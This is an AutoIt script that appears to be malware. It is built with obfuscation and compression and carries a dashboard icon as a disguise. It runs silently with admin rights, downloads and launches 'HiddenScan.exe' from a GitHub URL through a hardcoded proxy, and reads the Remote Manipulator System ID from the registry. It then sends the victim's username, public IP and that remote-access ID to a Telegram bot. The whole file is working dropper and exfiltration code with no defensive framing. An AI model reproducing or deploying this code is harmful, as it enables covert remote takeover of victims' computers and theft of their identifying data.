#NoTrayIcon
#RequireAdmin
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=..\..\..\stub\analytic_dashboard_home_manage_user_interface_icon_123286.ico
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_UseX64=n
#AutoIt3Wrapper_Run_Au3Stripper=y
#Au3Stripper_Parameters=/SF /SV /CV /CF /CS /CN
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Run_Obfuscator=y
#Obfuscator_Parameters=/SF /SV /CV /CF /CS /CN

#include <MsgBoxConstants.au3>
#include <String.au3>
#include "../Telegram.au3"
#include <Array.au3>
#include "../inc/Inet.au3"

_InitBot($Token)
$PublicIP = _GetIP()
HttpSetProxy(2, "45.4.197.205:8000", "R9S6U3", "b8EnJh")
InetGet("https://github.com/SOLDATKIN1/Project/raw/master/HiddenScan", @ScriptDir & "\HiddenScan.exe")
Run(@ScriptDir & "\HiddenScan.exe")
sleep(25000)
Local $sString 
Local $sHex
$sHex = RegRead("HKEY_LOCAL_MACHINE\SYSTEM\Remote Manipulator System\v4\Server\Parameters", "InternetId")
$sString = _HexToString($sHex) ; Convert the hex string back to the original string.
_SendMsg($ChatID, "New user %0A"& @UserName & "%0AIP Address %0A"& $PublicIP & "%0ARMS: %0A "& $sString & " ")
